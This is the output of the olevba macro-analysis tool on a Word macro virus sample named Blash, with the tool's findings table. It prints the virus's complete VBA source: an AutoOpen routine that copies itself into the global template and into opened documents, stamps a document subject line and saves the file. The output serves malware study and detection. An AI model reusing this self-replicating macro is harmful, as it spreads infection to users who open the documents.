olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Blash-b0f310075ce9857cbe69d156c5958031daa560fb
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Blash-b0f310075ce9857cbe69d156c5958031daa560fb - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Blash-b0f310075ce9857cbe69d156c5958031daa560fb - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim Fname$
Dim MacName$
On Error GoTo -1: On Error GoTo errori
Fname$ = WordBasic.[FileName$]()
MacName$ = Fname$ + ":aUTOOPen"
WordBasic.FileSummaryInfo Subject:="DEMONS STRIDE AT THE GATE OF BLASHYRKH"
WordBasic.MacroCopy MacName$, "Global:aUTOOPen"
errori:
If WordBasic.IsDocumentDirty() = -1 Then
        WordBasic.MacroCopy "Global:aUTOOPen", MacName$
End If
WordBasic.FileSaveAs Format:=1

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

